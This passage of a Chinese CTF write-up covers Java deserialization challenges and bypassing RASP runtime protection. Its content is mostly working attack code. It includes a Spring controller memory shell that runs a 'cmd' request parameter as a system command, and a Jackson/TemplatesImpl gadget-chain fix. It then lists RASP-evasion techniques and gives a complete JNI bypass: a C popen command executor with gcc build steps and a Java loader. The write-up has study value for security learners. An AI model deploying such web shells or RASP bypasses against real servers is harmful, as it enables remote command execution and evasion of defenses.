class="hljs-title function_">InjectToController</span><span class="hljs-params">(String aaa)</span> &#123;&#125;    <span class="hljs-comment">// controller指定的处理方法</span>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span>  IOException&#123;        <span class="hljs-comment">// 获取request和response对象</span>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();        <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();        <span class="hljs-comment">//exec</span>        <span class="hljs-keyword">try</span> &#123;            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;                java.lang.ProcessBuilder p;                <span class="hljs-keyword">if</span>(System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>))&#123;                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);                &#125;<span class="hljs-keyword">else</span>&#123;                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.lang.ProcessBuilder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);                &#125;                java.util.<span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.util.Scanner(p.start().getInputStream()).useDelimiter(<span class="hljs-string">&quot;A&quot;</span>);                o = c.hasNext() ? c.next(): o;                c.close();                writer.write(o);                writer.flush();                writer.close();            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-comment">//当请求没有携带指定的参数(code)时，返回 404 错误</span>                response.sendError(<span class="hljs-number">404</span>);            &#125;        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;    &#125;&#125;</code></pre></div><p>给出Boogipop的exp</p><p>但只有这两个还不行，要重写<code>writeArrayTable</code>，但大佬博客只有该方法的图，应该还是重写有问题，我是没有打通</p><p>怀疑运行时带有rasp，docker运行时修改CMD为<code>java -jar noMap.jar</code>       。。。。没有用</p><p>哈哈哈哈哈哈，我回来啦</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129163604636.png" alt="image-20231129163604636"></p><p>因为这里的反射调用的是rt.jar包下的class文件，所以在本地重写类是不行滴，要把jar包里的<code>ArrayTable</code>的class文件替换掉 （真的服了，而且调试的时候本地重写类被当作了源码，出现了牛头不对马嘴的情况）</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129164032405.png" alt="image-20231129164032405"></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129164159748.png" alt="image-20231129164159748"></p><p>但在题目中使用时会出现这样的报错</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129164335056.png" alt="image-20231129164335056"></p><p>很明显是jackson链子不稳定问题 ，TemplatesImpl后面加上这部分即可</p><div class="code-wrapper"><pre><code class="hljs java">Class&lt;?&gt; clazz = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);cons.setAccessible(<span class="hljs-literal">true</span>);<span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">advisedSupport</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();advisedSupport.setTarget(templatesImpl);<span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) cons.newInstance(advisedSupport);<span class="hljs-type">Object</span> <span class="hljs-variable">proxyObj</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(clazz.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;, handler);<span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(proxyObj);</code></pre></div><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129165021493.png" alt="image-20231129165021493"></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231129165147196.png" alt="image-20231129165147196"></p><h1 id="rasp"><a href="#rasp" class="headerlink" title="rasp"></a>rasp</h1><p><a href="https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP">https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP</a></p><p>说了那么多，但其实上面两题根本不关他的事（出题人都去掉了），现在就来说说它是什么</p><p>RASP 全称为 <code>Run­time Ap­pli­ca­tion Self-Pro­tec­tion</code>，实时程序自我保护。RASP 通常嵌入在程序内部，具备实时监控危险函数调用，并阻止该危险调用的功能。与传统 WAF 对比， RASP 实现更为底层，规则制定更为简单，攻击行为识别更为精准。</p><p>Java RASP 通常使用 java agent 技术实现，即作为jar包通过javaagent加载即可</p><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">javaagent:agent.jar </span>-<span class="hljs-keyword">jar </span>web.<span class="hljs-keyword">jar</span></code></pre></div><p>其实已经有好几道题见到了他们各种rasp的包了</p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116234022459.png" alt="image-20231116234022459"></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116234040641.png" alt="image-20231116234040641"></p><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231116234557231.png" alt="image-20231116234557231"></p><p>他们都是作为javaagent的参数加载的</p><p>实现方法如下</p><div class="code-wrapper"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">transform</span>(<span class="hljs-params">ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-built_in">byte</span>[] classfileBuffer</span>) throws IllegalClassFormatException</span> &#123;        <span class="hljs-keyword">if</span>(className.replace(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;.&quot;</span>).<span class="hljs-keyword">equals</span>(JndiManagerClassName))&#123;            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;[Vaccine] Start Patch JndiManager Lookup Method!&quot;</span>);            CtClass ctClass = <span class="hljs-literal">null</span>;            CtMethod ctMethod = <span class="hljs-literal">null</span>;            <span class="hljs-keyword">try</span>&#123;                <span class="hljs-comment">// 初始化classPool</span>                ClassPool classPool = <span class="hljs-keyword">new</span> ClassPool();                classPool.appendSystemPath();                <span class="hljs-keyword">if</span> (loader != <span class="hljs-literal">null</span>) &#123;                    classPool.appendClassPath(<span class="hljs-keyword">new</span> LoaderClassPath(loader));                &#125;                <span class="hljs-comment">// 构造CtClass</span>                ctClass = classPool.makeClass(<span class="hljs-keyword">new</span> ByteArrayInputStream(classfileBuffer));                <span class="hljs-comment">// 获取lookup方法</span>                <span class="hljs-keyword">for</span>(CtMethod method:ctClass.getMethods())&#123;                    <span class="hljs-keyword">if</span>(method.getName().<span class="hljs-keyword">equals</span>(JndiManagerLookupMethodName))&#123;                        ctMethod = method;                        <span class="hljs-keyword">break</span>;                    &#125;                &#125;                <span class="hljs-comment">// 修改lookup方法</span>                assert ctMethod != <span class="hljs-literal">null</span>;                <span class="hljs-comment">//ctMethod.insertBefore(&quot;if(name.startsWith(\&quot;ldap://\&quot;) || name.startsWith(\&quot;rmi://\&quot;))&#123;return null;&#125;&quot;);</span>                ctMethod.insertBefore(<span class="hljs-string">&quot;return null;&quot;</span>);                <span class="hljs-comment">// 返回字节码</span>                System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;[Vaccine] Patch JndiManager Lookup Success!&quot;</span>);                <span class="hljs-keyword">return</span> ctClass.toBytecode();            &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;                e.printStackTrace();            &#125;<span class="hljs-keyword">finally</span> &#123;                <span class="hljs-keyword">if</span> (ctClass != <span class="hljs-literal">null</span>) &#123;                    ctClass.detach();                &#125;            &#125;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">return</span> classfileBuffer;        &#125;        <span class="hljs-keyword">return</span> classfileBuffer;    &#125;</code></pre></div><p>使用 transform 方法对 org.apache.logging.log4j.core.net.JndiManager.lookup 方法进行运行时修改，使其提前返回 <code>return null</code>.</p><h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><blockquote><p>Boogipop大佬一句话概括绕过rasp的方法</p><p>通俗的说就是</p><p>创建一个native方法，</p><p>根据该方法生成c文件和h文件头以及dll文件，</p><p>利用这三个文件去调用c语言库中的函数执行系统函数。这样就可以绕过RASP HOOK的Runtime、Process等等东西。</p></blockquote><p>根据 RASP 不同的实现，通常有两种方法绕过：</p><ol><li><p>寻找没有被限制的类或者函数来绕过，也就是绕过黑名单</p></li><li><p>利用更底层的技术进行绕过，例如从 C 代码的层面进行绕过</p></li><li><p>更多请了解<a href="https://www.cnblogs.com/wh4am1/p/16780056.html">RASP的安全攻防研究实践 - admin-神风 - 博客园 (cnblogs.com)</a></p><blockquote><ol><li>破坏 RASP 的开关。OpenRASP 中存在一个 hook 开关，反射修改这个 hook 开关可关闭所有拦截。Jrasp 没有明显的开关可以去操控但作者也实现的类似的效果。</li><li>熔断开关。很多商业化的产品有类似的CPU熔断机制，如果 CPU 达到 90%，就自动关闭 Rasp 的拦截。因此可以通过发送一些大的数据包或者流量，造成 CPU 的压力来触发 RASP 的熔断开关</li><li>伪装恶意类。很多 RASP 产品是通过堆栈信息回溯的方式来判断命令执行的地方从哪里来，例如检测 behinder 时会判断堆栈是否包含net.rebeyond.behinder类开头的信息。作者给出了伪装类名的方法。</li><li>新建线程绕过。新建线程可以绕过堆栈检查，但无法绕过黑白名单。</li><li>Bootstrap ClassLoader 加载绕过内存马检测。某些 RASP 在检测内存马时，通过判断当前类的 ClassLoader 是否存在对应的 .class 文件落地，使用Instrumentation.appendToBootstrapClassLoaderSearch 方法加载的 jar 包是以 Bootstrap ClassLoader 加载的，因此能够绕过检测。</li><li>通过 Unsafe 方式绕过。Unsafe.allocateInstance方法可以实例化一个对象而不调用它的构造方法，再去执行它的 Native 方法，从而绕过 Rasp 的检测。作者给出的示例中，通过直接执行 forkAndExec 的 Native 方法来执行命令。</li><li>通过 WindowsVirtualMachine 注入 ShellCode 加载。向自身进程植入并运行 ShellCode 绕过 RASP</li><li>Java 跨平台任意 Native 代码执行。</li><li>弱引用 GC. 一种依托 WeakReference 弱引用的命令执行方式，有别于常规的命令执行，因此在某些场景下可以绕过。</li><li>高权限场景卸载 RASP。通过获取 tools.jar 的路径，调用里面的 JVM API 来卸载 RASP</li></ol></blockquote></li></ol><h3 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h3><p>MRCTF2022 springcoffee中的rasp，对<code>java.lang.ProcessImpl.start</code>进行过滤</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RaspTransformer</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;    <span class="hljs-keyword">private</span> Instrumentation inst;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">targetClassName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>;    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">String</span> <span class="hljs-variable">targetMethodName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;start&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RaspTransformer</span><span class="hljs-params">(Instrumentation inst)</span> &#123;        <span class="hljs-built_in">this</span>.inst = inst;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer) <span class="hljs-keyword">throws</span> IllegalClassFormatException &#123;        <span class="hljs-keyword">if</span> (className.replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>).equals(targetClassName)) &#123;            System.out.println(<span class="hljs-string">&quot;[Vaccine] Start Patch JndiManager Lookup Method!&quot;</span>);            <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;            <span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;            <span class="hljs-keyword">try</span> &#123;                <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>();                classPool.appendSystemPath();                <span class="hljs-keyword">if</span> (loader != <span class="hljs-literal">null</span>) &#123;                    classPool.appendClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LoaderClassPath</span>(loader));                &#125;                ctClass = classPool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(classfileBuffer));                CtMethod[] var9 = ctClass.getMethods();                <span class="hljs-type">int</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var9.length;                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var11 &lt; var10; ++var11) &#123;                    <span class="hljs-type">CtMethod</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> var9[var11];                    <span class="hljs-keyword">if</span> (method.getName().equals(targetMethodName)) &#123;                        ctMethod = method;                        <span class="hljs-keyword">break</span>;                    &#125;                &#125;                <span class="hljs-keyword">assert</span> ctMethod != <span class="hljs-literal">null</span>;                ctMethod.insertBefore(<span class="hljs-string">&quot;return null;&quot;</span>);                System.out.println(String.format(<span class="hljs-string">&quot;Patch %s %s  Success!&quot;</span>, targetClassName, targetMethodName));                <span class="hljs-type">byte</span>[] var18 = ctClass.toBytecode();                <span class="hljs-keyword">return</span> var18;            &#125; <span class="hljs-keyword">catch</span> (Exception var16) &#123;                var16.printStackTrace();            &#125; <span class="hljs-keyword">finally</span> &#123;                <span class="hljs-keyword">if</span> (ctClass != <span class="hljs-literal">null</span>) &#123;                    ctClass.detach();                &#125;            &#125;            <span class="hljs-keyword">return</span> classfileBuffer;        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> classfileBuffer;        &#125;    &#125;</code></pre></div><p><code>exec</code>追溯一下会发现是调用<code>ProcessImpl</code>的<code>start</code>方法，封掉了之前常见的<code>Runtime</code>,<code>ProcessBuilder</code></p><p>java命令执行的方式中追溯到底层只有<code>UNIXProcess</code>和<code>ProcessImpl</code>，因此可以用<code>UNIXProcess</code>进行绕过,最终调用<code>forkAndExec</code>方法</p><h3 id="JNI绕过RASP"><a href="#JNI绕过RASP" class="headerlink" title="JNI绕过RASP"></a>JNI绕过RASP</h3><p><img src="/../images/%E6%8F%90%E5%8F%8Arasp%E7%9A%84java%E9%A2%98/image-20231118200106740.png" alt="image-20231118200106740"></p><p><a href="https://dummykitty.github.io/posts/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87-RASP/#%E7%AC%AC%E4%B8%80%E6%AD%A5%E7%BC%96%E5%86%99-native-%E6%96%B9%E6%B3%95">Java 反序列化绕过 RASP | DummyKitty’s blog</a></p><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> com.javasec;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmdclass</span> </span>&#123;    <span class="hljs-keyword">public</span> native <span class="hljs-keyword">String</span> execCmd(<span class="hljs-keyword">String</span> cmd);&#125;</code></pre></div><p><code>javac .\Cmdclass.java</code></p><p><code>javac -cp . .\Cmdclass.java -h com.javasec.Cmdclass</code>(java8及以上的<code>javac -h</code>会一并生成头文件)</p><p><del>版本较低时生成头文件用的是<code>javah</code></del></p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jni.h&gt;</span></span><span class="hljs-comment">/* Header for class com_javasec_Cmdclass */</span><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _Included_com_javasec_Cmdclass</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> _Included_com_javasec_Cmdclass</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><span class="hljs-comment">/*</span><span class="hljs-comment"> * Class:     com_javasec_Cmdclass</span><span class="hljs-comment"> * Method:    execCmd</span><span class="hljs-comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span><span class="hljs-comment"> */</span><span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_com_javasec_Cmdclass_execCmd</span></span><span class="hljs-function">  <span class="hljs-params">(JNIEnv *, jobject, jstring)</span></span>;<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span>&#125;<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span></code></pre></div><p>根据这个<code>.h</code>文件写一个c文件</p><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;com_javasec_Cmdclass.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execCmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>*<span class="hljs-number">12</span>];              <span class="hljs-comment">//定义缓冲区</span>    FILE *pipe = <span class="hljs-built_in">popen</span>(cmd, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-comment">//打开管道，并执行命令</span>    <span class="hljs-keyword">if</span> (!pipe)        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//返回0表示运行失败</span>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">feof</span>(pipe))    &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fgets</span>(buffer, <span class="hljs-number">128</span>, pipe))        &#123; <span class="hljs-comment">//将管道输出到result中</span>            <span class="hljs-built_in">strcat</span>(result, buffer);        &#125;    &#125;    <span class="hljs-built_in">pclose</span>(pipe); <span class="hljs-comment">//关闭管道</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">//返回1表示运行成功</span>&#125;<span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_com_javasec_Cmdclass_execCmd</span><span class="hljs-params">(JNIEnv *env, jobject class_object, jstring jstr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(env, jstr, <span class="hljs-literal">NULL</span>);    <span class="hljs-type">char</span> result[<span class="hljs-number">1024</span> * <span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//定义存放结果的字符串数组</span>    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == <span class="hljs-built_in">execCmd</span>(cstr, result))    &#123;       <span class="hljs-comment">// printf(result);</span>    &#125;    <span class="hljs-type">char</span> return_messge[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-built_in">strcat</span>(return_messge, result);    jstring cmdresult = (*env)-&gt;<span class="hljs-built_in">NewStringUTF</span>(env, return_messge);    <span class="hljs-comment">//system();</span>    <span class="hljs-keyword">return</span> cmdresult;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-comment">//linux</span>gcc -fPIC -I<span class="hljs-string">&quot;$JAVA_HOME/include&quot;</span> -I<span class="hljs-string">&quot;$JAVA_HOME/include/linux&quot;</span> -shared -o libcmd<span class="hljs-selector-class">.so</span> Cmdclass<span class="hljs-selector-class">.c</span><span class="hljs-comment">//windows</span>gcc -I<span class="hljs-string">&quot;%JAVA_HOME%\include&quot;</span> -I<span class="hljs-string">&quot;%JAVA_HOME%\include\win32&quot;</span> -shared -o libcmd<span class="hljs-selector-class">.dll</span> Cmdclass<span class="hljs-selector-class">.c</span></code></pre></div><p>最后system.load()加载即可  （）</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.javasec;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNIDemo</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;        System.load(<span class="hljs-string">&quot;D:\ctf文件\maze\cmd.dll&quot;</span>);        <span class="hljs-type">Cmdclass</span> <span class="hljs-variable">cmdclass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cmdclass</span>();        <span class="hljs-type">String</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> cmdclass.execCmd(<span class="hljs-string">&quot;whoami&quot;</span>);        System.out.println(res);    &#125;&#125;</code></pre></div><h4 id="保存一下题目成功的步骤-（不用看，这是我的）"><a href="#保存一下题目成功的步骤-（不用看，这是我的）" class="headerlink" title="保存一下题目成功的步骤 （不用看，这是我的）"></a>保存一下题目成功的步骤 （不用看，这是我的）</h4><div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> jackson;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cmdclass</span></span>&#123;    <span class="hljs-keyword">public</span> native <span class="hljs-keyword">String</span> execCmd(<span class="hljs-keyword">String</span> cmd); &#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">javac </span>.\Cmdclass.<span class="hljs-keyword">java</span><span class="hljs-keyword"></span><span class="hljs-keyword">javac </span>-cp . .\Cmdclass.<span class="hljs-keyword">java </span>-h <span class="hljs-keyword">jackson.Cmdclass</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-comment">/* DO NOT EDIT THIS FILE - it is machine generated */</span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;jni.h&gt;</span></span><span class="hljs-comment">/* Header for class jackson_Cmdclass */</span><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> _Included_jackson_Cmdclass</span><span class="hljs-meta">#<span class="hljs-keyword">define</span> _Included_jackson_Cmdclass</span><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><span class="hljs-comment">/*</span><span class="hljs-comment"> * Class:     jackson_Cmdclass</span><span class="hljs-comment"> * Method:    execCmd</span><span class="hljs-comment"> * Signature: (Ljava/lang/String;)Ljava/lang/String;</span><span class="hljs-comment"> */</span><span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_jackson_Cmdclass_execCmd</span></span><span class="hljs-function">  <span class="hljs-params">(JNIEnv *, jobject, jstring)</span></span>;<span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span>&#125;<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span></code></pre></div><p>参照头文件写恶意c文件，包含头文件</p><div class="code-wrapper"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;jackson_Cmdclass.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">execCmd</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *cmd, <span class="hljs-type">char</span> *result)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-type">char</span> buffer[<span class="hljs-number">1024</span>*<span class="hljs-number">12</span>];              <span class="hljs-comment">//定义缓冲区</span>    FILE *pipe = <span class="hljs-built_in">popen</span>(cmd, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-comment">//打开管道，并执行命令</span>    <span class="hljs-keyword">if</span> (!pipe)        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; <span class="hljs-comment">//返回0表示运行失败</span>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">feof</span>(pipe))    &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fgets</span>(buffer, <span class="hljs-number">128</span>, pipe))        &#123; <span class="hljs-comment">//将管道输出到result中</span>            <span class="hljs-built_in">strcat</span>(result, buffer);        &#125;    &#125;    <span class="hljs-built_in">pclose</span>(pipe); <span class="hljs-comment">//关闭管道</span>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">//返回1表示运行成功</span>&#125;<span class="hljs-function">JNIEXPORT jstring JNICALL <span class="hljs-title">Java_jackson_Cmdclass_execCmd</span><span class="hljs-params">(JNIEnv *env, jobject class_object, jstring jstr)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cstr = (*env)-&gt;<span class="hljs-built_in">GetStringUTFChars</span>(env, jstr, <span class="hljs-literal">NULL</span>);    <span class="hljs-type">char</span> result[<span class="hljs-number">1024</span> * <span class="hljs-number">12</span>] = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">//定义存放结果的字符串数组</span>    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span> == <span class="hljs-built_in">execCmd</span>(cstr, result))    &#123;       <span class="hljs-comment">// printf(result);</span>    &#125;    <span class="hljs-type">char</span> return_messge[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-built_in">strcat</span>(return_messge, result);    jstring cmdresult = (*env)-&gt;<span class="hljs-built_in">NewStringUTF</span>(env, return_messge);    <span class="hljs-comment">//system();</span>    <span class="hljs-keyword">return</span> cmdresult;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs shell">gcc -fPIC -I $JAVA_HOME/include  -I $JAVA_HOME/include/linux -shared -o libcmd.so Rce.c</code></pre></div><h4 id="小细节"><a href="#小细节" class="headerlink" 